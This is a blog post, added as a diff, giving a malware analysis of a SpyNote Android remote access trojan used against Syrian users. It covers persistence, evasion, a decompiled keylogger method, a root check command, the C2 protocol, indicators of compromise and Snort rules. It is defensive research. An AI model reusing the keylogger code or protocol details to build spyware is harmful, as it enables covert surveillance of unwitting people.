@@ -1,0 +1,597 @@
+---
+layout: post
+title: "An in-depth analysis of SpyNote remote access trojan"
+date: 2020-08-05 20:49:00 +0200
+categories: android malware spyware
+---
+
+*Note: This post is a copy of [an article published on Bulldogjobs](https://bulldogjob.pl/articles/1200-an-in-depth-analysis-of-spynote-remote-access-trojan#1) with extended contents.*
+
+**Table of contents**
+* table of contents
+{:toc}
+
+## Introduction
+
+Lookout researchers have recently discovered[^1] a surveillance campaign targeting Syrian citizens and it is believed that the actor behind the attack was state-sponsored. The campaign had been active since January 2018. Its goal was to infect Android mobile devices with remote access trojans (RATs) and then spy on people in possession of those devices. The victims were tricked into downloading and installing innocent-looking mobile applications which were actually spyware. The applications were shared through various communication channels, however they were never available on the official Google Play Store. Some of applications attempted to masquerade as legitimate ones like Telegram, others were COVID trackers or benign tools like a fake digital thermometer, while others impersonated Android built-in tools. The common factor was that all of them had an additional functionality - allowing the adversary to spy on the users who installed them.
+
+In this paper we will examine the internals of one of those applications to analyze its capabilities and understand how it is used by the threat actors.
+
+### What is a remote access trojan (RAT)?
+
+A Remote Access Trojan (RAT) is a type of malware that controls a system through a remote network connection. A RAT is typically installed without the victim's knowledge, often as payload of a trojan horse program, and will try to hide its operation from the victim and from security software and other anti-virus software.[^2]
+
+A RAT enables its operators to perform many activities on the compromised device, e.g. control a device's camera, access its storage, intercept calls and text messages, etc. This is all done via an easy-to-use application hosted on a command and control server.
+
+
+## Analysis
+
+### Executive summary 
+
+A sample Android application was chosen for analysis from a pool of 71 malicious ones reported by Lookout, in their research. The sample examined is an instance of the SpyNote RAT.
+
+Chosen application details:
+
+| Property                 | Value                                                        |
+| ------------------------ | ------------------------------------------------------------ |
+| Package name             | `com.android.tester`                                         |
+| Main activity            | `com.android.tester.C7`                                      |
+| Minimum SDK              | 10                                                           |
+| Target SDK               | 22                                                           |
+| Compile SDK              | 23                                                           |
+| Application name         | Android                                                      |
+| Application version name | 6.4.4                                                        |
+| File type                | APK                                                          |
+| File size                | 780.72 KB (799461 bytes)                                     |
+| MD5                      | 36022a7280f87689ed1844c312463629                             |
+| SHA1                     | 8cae26c899440f890a8faca2e63ba42c0195cd3b                     |
+| SHA256                   | d96f9eafdc3c44611004ac151ae51cdff7a7fa41555389fd36479de442b400a0 |
+
+After the application is installed, it is displayed as `Android` with the icon resembling the one of the built-in Android applications `Settings`.
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200521170727402.png" alt="Malware icon" style="zoom:50%;" />
+
+`AndroidManifest.xml` file reveals that malware takes advantage of a number of permissions[^3], allowing it to have the following capabilities:
+
+- track location of the device (GPS and network-based),
+- use Bluetooth,
+- make and intercept calls,
+- reroute or block outgoing calls,
+- access camera,
+- access external storage,
+- access history of calls,
+- access contact list,
+- read SMS,
+- access microphone,
+- displaying content over other applications,
+- read Web bookmarks and history,
+- persist after reboot,
+- retrieve list of running apps,
+- clickjacking via `Accessibility Services`[^4].
+
+### Technical details 
+
+#### Initial access
+
+While the distribution channel for the application sample remains unknown, it was surely never available on the official Google Play Store. Most likely, the malware was spread via other means, e.g. as a spearphishing attachment or a link.
+
+A SpyNote client can masquerade as legitimate application ([MITRE T1444](https://attack.mitre.org/techniques/T1444/)). Static code analysis indicates that the malware, after successful installation, would install a legitimate application embedded in the `APK` file at `res/raw/google.apk`. See the pseudo code responsible for that feature[^5]. Also, screenshots of cracked SpyNote server v6.4.4[^6] proves that functionality:
+
+<img src="{{site.url}}{{site.img}}\spynote_article.assets\image-20200525143508362.png" alt="APK builder" style="zoom:50%;" />
+
+The adversary can pick a name of the application, service, its version, and the name of a victim to be able to differentiate them. This values can be extracted from the `res/values/strings.xml` file. In this particular example they were set as follows:
+
+```xml
+<string name="n">Hamody</string> <!-- Victim Name -->
+<string name="app_name">Android</string> <!-- App Name -->
+<string name="s">Android</string> <!-- Service Name -->
+<string name="v">6.4.4</string> <!-- Version -->
+```
+
+This sample did not include any additional applications and the file `res/raw/google.apk` was empty.
+
+<img src="{{site.url}}{{site.img}}\spynote_article.assets\image-20200525140249109.png" alt="google.apk file" style="zoom:80%;" />
+
+The reason it was left was so that the malware, when executed, simply loads the legitimate `android.settings.ACCESSIBILITY_SETTINGS` intent:
+
+<img src="{{site.url}}{{site.img}}\spynote_article.assets\Screenshot_1590097404.png" alt="Accessibility intent" style="zoom:30%;"/>{: .align-right}
+
+![Accessibilitiy intent code]({{site.url}}{{site.img}}\spynote_article.assets\image-20200525142712187.png)
+
+#### Persistence
+
+Android applications, including malware, can listen for the `BOOT_COMPLETED` broadcast event to ensure the application will be activated upon device start up, and this is the technique that SpyNote utilizes to achieve its persistence mechanism ([MITRE T1402](https://attack.mitre.org/techniques/T1402)). As per the `AndroidManifest.xml` file, the class that is receiving the `BOOT_COMPLETED` event is `com.android.tester.C4`:
+
+```xml
+<receiver android:name="com.android.tester.C4" android:enabled="true" android:exported="true">
+  <intent-filter>
+    <action android:name="android.intent.action.BOOT_COMPLETED"/>
+  </intent-filter>
+</receiver>
+```
+
+This class waits for the `BOOT_COMPLETED` broadcast, checks if the `com.android.tester.C11` service is already running, and, if not, initiates it. The service is responsible for processing commands received from the C2 server and is also the class where most of the code resides.
+
+![com.android.tester.C4 class code]({{site.url}}{{site.img}}\spynote_article.assets\image-20200518105516838.png)
+
+Moreover, it is worth noting that the application may abuse the device administrator API[^6], and if granted, it will make removal of the malware harder ([MITRE T1401](https://attack.mitre.org/techniques/T1401/)). SpyNote requests that access when it is executed.
+
+<img src="{{site.url}}{{site.img}}\spynote_article.assets\Screenshot_1590097466.png" alt="Device Administrator Access request" style="zoom:33%;" />
+
+The following are all policies enforced by the spyware:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<device-admin
+  xmlns:android="http://schemas.android.com/apk/res/android">
+    <uses-policies>
+        <limit-password />
+        <watch-login />
+        <reset-password />
+        <force-lock />
+        <wipe-data />
+        <expire-password />
+        <encrypted-storage />
+        <disable-camera />
+    </uses-policies>
+</device-admin>
+```
+
+#### Defense Evasion
+
+SpyNote is able to discover installed applications ([MITRE T1418](https://attack.mitre.org/techniques/T1418/)), so that the attackers can tell which security appliances are deployed to a device. Also, if there are no applications other than the built-in ones, it may indicate that the malware is running in a controlled environment and that it is being analyzed by researchers. Another reason for collection of the list of applications is to discover high value applications like banking or messaging software. Application discovery is achieved using the `PackageManager` class:
+
+![Application Discovery]({{site.url}}{{site.img}}/spynote_article.assets/image-20200526143833774.png)
+
+The above code not only extracts names of the installed applications, but also their installation dates and icons.
+
+This is what the operators controlling the device see[^8]:
+
+<img src="{{site.url}}{{site.img}}\spynote_article.assets/image-20200526190659939.png" alt="List of extracted applications" style="zoom:66%;" />
+
+There is a large quantity of other data[^7] that malware extracts [(MITRE T1426](https://attack.mitre.org/techniques/T1426/), [T1422)](https://attack.mitre.org/techniques/T1422/), most likely for the operators to be able to easily tell that it is running in a virtual machine [(MITRE T1523)](https://attack.mitre.org/techniques/T1523/). The following are main information categories that the adversary takes advantage of:
+
+- device,
+- system,
+- SIM,
+- WiFi,
+- audio,  
+- Bluetooth,  
+- location.
+
+For most Android Virtual Devices (AVDs), the data above will not vary too much by default and it is more than enough information to determine whether the infected system is a real mobile device or an emulator. Code analysis did not reveal any automation around malware self-removal based on this data, the decision is most likely manually done by the attacker after review of the device data. Analysis of the SpyNote server usage[^6] indicates that it is indeed used only to be displayed to the attacker:
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200526192143597.png" alt="List of extracted applications" style="zoom:50%;" />
+
+It can also be seen on the footage[^6] that the tool embedded in SpyNote's C2 can be used to generate APKs. It is highly customizable and allows the attacker to choose whether application should be hidden or not. Other possibilities include enabling key logging, device administration, leveraging `SuperSU` if the device is rooted, and deactivating icons.
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200601220659481.png" alt="SpyNote APK builder" style="zoom:50%;" />
+
+The settings visible above are reflected in `gp` variable in `strings.xml` file:
+
+```xml
+<string name="gp">11111</string>
+```
+
+For example, the first character of the above strings corresponds to `Hide Application` setting - if it equals `1`, the following code will be triggered (`C7` class was renamed to `C0533C7` for easier analysis):
+
+![Hiding application]({{site.url}}{{site.img}}/spynote_article.assets/image-20200601221408484.png)
+
+As a result of the code execution, the application icon will be hidden [(MITRE T1508)](https://attack.mitre.org/techniques/T1508/) for the user.
+
+SpyNote operators can use `Device Administrator` access to wipe data [(MITRE T1447)](https://attack.mitre.org/techniques/T1447/), lock it [(MITRE T1446)](https://attack.mitre.org/techniques/T1446/), or reset password:
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200602110130628.png" alt="Device Administrator actions" style="zoom:80%;" />
+
+Another notable defense evasion technique is code obfuscation to make reverse engineering harder for researchers [(MITRE T1406)](https://attack.mitre.org/techniques/T1406/):
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200602012511077.png" alt="Sample fields and methods in class C11" style="zoom:80%;" />
+
+#### Credential Access
+
+This sample does not have SMS capture capabilities, it only extracts the senders of messages. The following contact data is pulled [(MITRE T1432)](https://attack.mitre.org/techniques/T1432/) by the RAT:
+
+![Contact data items]({{site.url}}{{site.img}}/spynote_article.assets/image-20200602020210417.png)
+
+SpyNote makes use of accessibility API by overriding `onAccessibilityEvent` method to log keystrokes. The logs are saved to external storage to file `configdd-MM-yyy.log` where `dd-MM-yyyy` is the date of when the keystrokes were captured. The data can be then downloaded by the malware operators.
+
+```java
+public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
+        try {
+            String a = m1819a(accessibilityEvent);
+            String str = (String) accessibilityEvent.getPackageName();
+            StringBuilder sb = new StringBuilder();
+            if (a.startsWith("[") && a.endsWith("]")) {
+                a = a.substring(1, a.length() - 1);
+            }
+            if (!this.f1163b.equals(a)) {
+                this.f1163b = a;
+                if (str != null && a.length() != 0) {
+                    String format = new SimpleDateFormat("HH:mm a", Locale.ENGLISH).format(new Date());
+                    String string = getApplicationContext().getResources().getString(R.string.gp);
+                    String str2 = new String("-1");
+                    if (string.charAt(2) == '0') {
+                        // redacted application icon extraction
+                    }
+                    if (str != null && a != null && format != null) {
+                        if (C11.f1164A) {
+                            C11.m1858a(C11.m1851a(C11.f1181m, 50) + C11.f1175f + C11.m1851a(C11.f1181m, 115) + C11.f1175f + str2 + C11.f1177h + a + C11.f1177h + str + C11.f1177h + format);
+                        }
+                        sb.append(str2 + C11.f1177h + a + C11.f1177h + str + C11.f1177h + format + C11.f1176g);
+                        String string2 = getApplicationContext().getResources().getString(R.string.s);
+                        if ("mounted".equals(Environment.getExternalStorageState())) {
+                            File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + string2.trim());
+                            if (!file.exists()) {
+                                file.mkdirs();
+                            }
+                            try {
+                                String format = new SimpleDateFormat("dd-MM-yyyy", Locale.ENGLISH).format(new Date());
+                                String string = getApplicationContext().getResources().getString(R.string.s);
+                                File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + string.trim());
+                                if (file.exists()) {
+                                    FileWriter fileWriter = new FileWriter(file.getPath() + "/config" + format + ".log", true);
+                                    fileWriter.write(sb.toString());
+                                    fileWriter.close();
+                                }
+                            } catch (IOException unused) {
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (Exception unused) {
+        }
+    }
+```
+
+The spyware has a `File Manager` feature allowing to access files [(MITRE T1409](https://attack.mitre.org/techniques/T1409/), [T1420)](https://attack.mitre.org/techniques/T1420/) like application data, pictures, downloads, and others, that are kept in the external storage:
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200602112717582.png" alt="File Manager feature code" style="zoom:80%;" />
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200602112853641.png" alt="File Manager as seen by the attackers" style="zoom:50%;" />
+
+
+
+#### Discovery
+
+SpyNote has a location tracking [(MITRE T1430)](https://attack.mitre.org/techniques/T1430/) feature based on GPS and network data. The location data is obtained by registering `LocationListener` using `requestLocationUpdates` method from `LocationManager` class.
+
+#### Impact
+
+The malware has access to phone call logs [(MITRE T1433)](https://attack.mitre.org/techniques/T1433/) and allows making phone calls. Every call event is logged and sent to the operators:
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200602133945957.png" alt="Call logs" style="zoom:80%;" />
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200602134218886.png" alt="Make call feature" style="zoom:80%;" />
+
+#### Collection
+
+Moreover, a remote command can be issued to capture audio [(MITRE T1429)](https://attack.mitre.org/techniques/T1429/) or camera [(MITRE T1512)](https://attack.mitre.org/techniques/T1512/). Available audio sources[^9] are `DEFAULT`, `MIC`, `VOICE_RECOGNITION`, `VOICE_COMMUNICATION`, and `CAMCORDER`. The code is designed to allow to obtain live footage from all cameras available on a  device with additional capabilities like zoom, flash etc.
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200602141145534.png" alt="Audio recording" style="zoom:80%;" />
+
+SpyNote, if `Permission Root SuperSU` option is set when building APK, will execute Android Debug Bridge (ADB) `su` command followed by `/system/bin/screencap -p /sdcard/rootSU.png` [(MITRE T1513)](https://attack.mitre.org/techniques/T1513/). The idea behind that is to check if the device is "rooted". If the command executes without errors and the file `rootSU.png` is present on the external storage, it means that the adversary may leverage root privilege.
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200602152208522.png" alt="screencap to check root" style="zoom:80%;" />
+
+#### Exfiltration
+
+The collected data exfiltration is achieved over the command and control channel. All commands and data are sent via the normal communications channel. All traffic sent by a victim's device is compressed before being sent using `java.util.zip.GZIPOutputStream` class:
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200602170852134.png" alt="Data compression" style="zoom:80%;" />
+
+#### Command and Control
+
+Command and control (C2, C&C) traffic is sent over an uncommonly used port `tcp/215` [(MITRE T1509)](https://attack.mitre.org/techniques/T1509/) but it is also possible for SpyNote to communicate via any other TCP port. The IP address and port are chosen during the APK building process:
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200602172836761.png" alt="C2 server configuration " style="zoom:67%;" />
+
+These values can be found in `strings.xml` file extracted from APK:
+
+```xml
+<string name="h">82.137.218[.]185</string> <!-- sanitized -->
+<string name="p">215</string>
+<string name="ps">null</string>
+```
+
+SpyNote uses a custom TCP protocol for C&C communications:
+
+![C2 protocol]({{site.url}}{{site.img}}/spynote_article.assets/image-20200602174938902.png)
+
+The traffic always starts with the payload size followed by a `0x00` null byte. The payload from a victim to the C2 server is always GZIP `DEFLATE`-compressed and, thus, starts with `0x1f8b08` bytes[^10].
+
+The above payload was the initial one sent to the C2 and can be easily decompressed:
+
+```bash
+$ echo "1f8b0800000000000000ad56c9d6ab380e7e957f559b2c98032c0d98314098033b8600614e026178fa22b953dfdb7d4ed7a2744e6c7db29065497684a1384560284eb2ddd4341f0643d1bff2b8795e3f68263f13f553e7ebafaf9faa085b212400965347aa5d000e586047fb0c04842c94def10ce182718e8b46aa0bbd7d0dee0a4a083ea4ecdadc9874f6ead519af886514dcc01fc4952161cc7f4aff27edd6d831fcccfbfeeec9fa475ffd1f6aeae862546f8e790fb2bd066213bf1d8b3eeed9dd0f7cfd866f3f70f50dafbea80a6fae7f63beecfec0b73f3091c91cfac6ebb7efab54563f98f81c6b1913d9af7ef9f78e27d0a380f2bd7794c4e28d5320ebc02b381940e5df08c23fa3dff2c7bdfadd15f3bce71c98d63b263f3d91b43d743c51eef9918c210cfcbef8b1a46aeff1b01f8ac737822bd3167e5ff924938fda3dbf67addb7923d845907d8b87e49713dc6ff67eab87007b6681fe4bf5235f9aa4f1dd37f7f18f9b813d732f2031209ab92790bc5dcea9402241388309f07bb00b30030102e3852400eaef9ae6fef55ffeb1fdefdbfd667b3fe75e187bd5e940e79402f0d08202b4646401e01d4b8e7bebfd4e12982d9907b5c8bf100884748f9eb2dbf3440e1422f7f3ae411e2c1072b652ea1690202ada1c2e2eb355784aad71752ccfbced553a0d6b7d941d26df6d714fee6d8bfbaffb6a896056246e2e5484b1c069d96bc15276c77465dff73fd4141bac70b12c00610345ae85325c95d5ea24aecf60155272c99c91188059d873be9f55b781c0005646c7de376d8eeac45acb66338be53e6bb780b2b733366c2b32993941d00a3eeb4318b220f60d2dc2101a3583b94ae89031724c18b095f20f533ed347f1256ca497a9c276c21214cf8f69ae3f3321cc85bd5ac0a97e9227c9463123087de34493a7e06570db40900b7a509843b09e2ed3edb80a5485986888dfd8d6f3f4d21c05cfa38e5147b5dd829346ff227b87672d73d8904a8faf2a45eb8ae76b87a27132944612c764a54ee64408a62400e1643e91fb84a96d8cf40d7be88fd801794d1bee2457896fdd8aac653db3518677d7d54479975ec5184dbbd3fdcc4e25b36d78e824dbd32e6129a78ece1c59c79cb22bdd3cc35ae9a9fc7eb936c8f06aca9bc2481ee755843c6648174fcba28b2c8dcd16393f8ee2f388ad673d7d558f36e3dc583fad04567a536aabf7749db743b1aa1ce37ab495e744fc4ac9d86a8959f60e9b3680cdbc26519e65316d8b5724c6326501c10a0bff71e8058af2b66dc51d2a337d553e3aebb5efa3ecd40cc0412a91b4aeb28d2ac0a9cdf9e9040d23bd9ee43d269f6332b2a41b9400bbc788d9313ec3961a46d3366c1bad8e3ad199aec154a2a8ec2ef8bdbbcafbb605a78ca9ddbb83c259c703e39ce5609acfd773c285500813a7a0287340190da3aec11648faf37ce23dcd3fd1ce991ab0f16651aec18d0e190ec7a8c1f157ec5e9a1be9f7c4eaea6423bd5e11e2ce2a8a1dd3837f7ad5e5c3c6a8146973f93c0d18de23f1018f373f6e06f72e2cdcc5ea1e847009f3514e6cc05b27c77069f27c5e18c3488f349c3a74beb9f18077484e2d96fe9054c6196dc1d9dfe9476b7108866fd985b1dc27f6228386165ee730b4a3977f500ff186b794433ca2162a65c09209c00623bc04a175d2137da9029451f01b702a7f620d37c573e8114f2257d45e37199118bdd102c26100f7657f3b957b5ade8dd7993de54abdecf557d5fccdb646bfe679ad8882ac893ca85bb6c3f781a16bda4db50d9ae1f6bd0d3daa7a9657c5780fe42cc6cf3b32de7bf0707558907663caf31e40a85afd3adce27ed1a90464bcc15260ef587c9c4eb705c6fe7ef9c1e5ec4d42e35b5e6d929a9751500bdcc1c93cdbce30135875b2cc87869ae8fcb42c97e42567e3a3eb8496df2ca20389afc0c0ef34dc7398b450051d99793c5e9697760eb950093af446c9eaa02f0feff67cb4c5d06df421b838fd2a41849aa5a8c9c472998a289c6f1a1498fd0523435b6bf8810c2ffc253dd1817e3f06041e3b2d68cf56c3dde6a6b29f91bdffd7b5860fb4ba0606bcf3ca094af0a4a48f21d4563bb00f8c47f3255f05e9113cb1557b8c3d55056d2aa86570f41a4594430d5a93d491ed93f3ba444bd022091653f2efd955b13bf43c46872018f5a56573c7ba4d5b89b43e1d487465aa2e7764af50acc9b984b9a85fe4c69594529517a755d4052e61ea600b7ec5521b5624fde21f67a5383d43f2a04338f8fcecbb8a12d64d2ed0395fc1870ebd44399f64690b4bd5bbddb58b7fbfa7425c3f474d1ab532759eb3a87521319981c7a1e9b9c4c347e083ab4f71ca95e430375b5518c21bfb20f42335dcac5a2c16deeb2242ce367d30ed68d67324fa34a572dcf6d9fa61a5be2f9aeb17e8b2477fcbbe1c41fb4aa65b337ee5fde36b618edffbddbda5c5d90f9f1f518a6512ea48253841a5d97785ef03f36e7cff06af257e1b320b0000" | xxd -r -p | zcat
+1025310249null10249100&false10249w410249510249null & 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 Android SDK built for x861024910 & 2910249f60598b565b235cd102491024910248null
+```
+
+The above `base64`[^11] string is an encoded JPG file containing a part of the device's screen:
+
+![image-20200602175826465]({{site.url}}{{site.img}}/spynote_article.assets/image-20200602175826465.png)
+
+After the initial payload is sent to C2 server, the beaconing activity between the device and the C&C server begins:
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200602213148098.png" alt="Beaconing" style="zoom:100%;" />
+
+The server sends `35 00 70 6f 69 6e 67` which is similar to the described above protocol:
+
+- `0x35` - payload size (5 ASCII)
+- `0x00` - null byte
+- `0x706f696e67` - `poing` in ASCII
+
+The victim responds with `0x3333001f8b08000000000000002b28cd2d30343032b1c82bcdc901007d342eed0d000000`:
+
+- `0x3333` - payload size (33 ASCII)
+- `0x00` - null byte
+- `0x1f8b08000000000000002b28cd2d30343032b1c82bcdc901007d342eed0d000000` - GZIP compressed string `pump10248null`
+
+Delta time between beacons sent to the C2 is not consistent and seems to depend on the network latency but no more than 24 seconds was observed during analysis.
+
+<img src="{{site.url}}{{site.img}}/spynote_article.assets/image-20200602215144398.png" alt="TCP beacon delta time" style="zoom:100%;" />
+
+
+
+## Conclusion
+
+Analysis of the SpyNote sample indicates that the threat actors behind the surveillance campaign had extensive control over victims' devices. Not only does this malware have a considerable list of features, but is also highly customizable, evades detection and deceives victims into downloading, installing, and providing full access to their devices. It should not be surprising that the threat actor was able to run the campaign for over a dozen years. It is also evident that users should be educated to not install mobile applications from non-official application stores. Moreover, Device Administrator privilege should be granted only to trusted applications.
+
+## Detection
+
+### Indicators of compromise (IOCs)
+
+| Type         | IOC                                                          |
+| ------------ | ------------------------------------------------------------ |
+| Package name | `com.android.tester`                                         |
+| MD5          | 36022a7280f87689ed1844c312463629                             |
+| SHA1         | 8cae26c899440f890a8faca2e63ba42c0195cd3b                     |
+| SHA256       | d96f9eafdc3c44611004ac151ae51cdff7a7fa41555389fd36479de442b400a0 |
+| IP           | 82.137.218[.]185                                             |
+| Port          | tcp/215                                       |
+
+
+
+
+### MITRE ATT&CK Techniques
+
+| Technique                                            | Reference                                           |
+| ---------------------------------------------------- | --------------------------------------------------- |
+| Abuse Device Administrator Access to Prevent Removal | [T1401](https://attack.mitre.org/techniques/T1401/) |
+| App Auto-Start at Device Boot                        | [T1402](https://attack.mitre.org/techniques/T1402/) |
+| Obfuscated Files or Information                      | [T1406](https://attack.mitre.org/techniques/T1406/) |
+| Access Stored Application Data                       | [T1409](https://attack.mitre.org/techniques/T1409/) |
+| Application Discovery                                | [T1418](https://attack.mitre.org/techniques/T1418/) |
+| File and Directory Discovery                         | [T1420](https://attack.mitre.org/techniques/T1420/) |
+| System Network Configuration Discovery               | [T1422](https://attack.mitre.org/techniques/T1422/) |
+| System Information Discovery                         | [T1426](https://attack.mitre.org/techniques/T1426/) |
+| Capture Audio                                        | [T1429](https://attack.mitre.org/techniques/T1429/) |
+| Location Tracking                                    | [T1430](https://attack.mitre.org/techniques/T1430/) |
+| Access Contact List                                  | [T1432](https://attack.mitre.org/techniques/T1432/) |
+| Access Call Log                                      | [T1433](https://attack.mitre.org/techniques/T1433/) |
+| Masquerade as Legitimate Application                 | [T1444](https://attack.mitre.org/techniques/T1444/) |
+| Device Lockout                                       | [T1446](https://attack.mitre.org/techniques/T1446/) |
+| Delete Device Data                                   | [T1447](https://attack.mitre.org/techniques/T1447/) |
+| Deliver Malicious App via Other Means                | [T1476](https://attack.mitre.org/techniques/T1476/) |
+| Suppress Application Icon                            | [T1508](https://attack.mitre.org/techniques/T1508/) |
+| Uncommonly Used Port                                 | [T1509](https://attack.mitre.org/techniques/T1509/) |
+| Capture Camera                                       | [T1512](https://attack.mitre.org/techniques/T1512/) |
+| Screen Capture                                       | [T1513](https://attack.mitre.org/techniques/T1513/) |
+| Evade Analysis Environment                           | [T1523](https://attack.mitre.org/techniques/T1523/) |
+
+
+
+### Snort rules
+
+```
+alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"SpyNote C&C server beacon"; flow:to_client,established; content:"|35 00 70 6F 69 6E 67|"; reference:url,blog.relativity.com; classtype:trojan-activity; sid:1000001; rev:1;)
+```
+
+```
+alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"SpyNote C&C client beacon"; flow:to_server,established; content:"|33 33 00 1F 8B 08 00 00 00 00 00 00 00 2B 28 CD 2D 30 34 30 32 B1 C8 2B CD C9 01 00 7D 34 2E ED 0D 00 00 00|"; reference:url,blog.relativity.com; classtype:trojan-activity; sid:1000002; rev:1;)
+```
+
+```
+alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"SpyNote C&C data exfiltration"; flow:to_server,established; content:"|00 1F 8B 08|"; depth:11; pcre:"/[0-9]{1,7}\x00\x1F\x8B\x08.*/s"; reference:url,blog.relativity.com; classtype:trojan-activity; sid:1000003; rev:1;)
+```
+
+## Apendices
+
+### Appendix A: Full list of permissions used by the analyzed application
+
+```
+android.permission.FLASHLIGHT
+android.permission.CAMERA
+android.permission.BLUETOOTH
+android.permission.READ_EXTERNAL_STORAGE
+android.permission.WRITE_CALL_LOG
+com.android.browser.permission.READ_HISTORY_BOOKMARKS
+android.permission.SYSTEM_ALERT_WINDOW
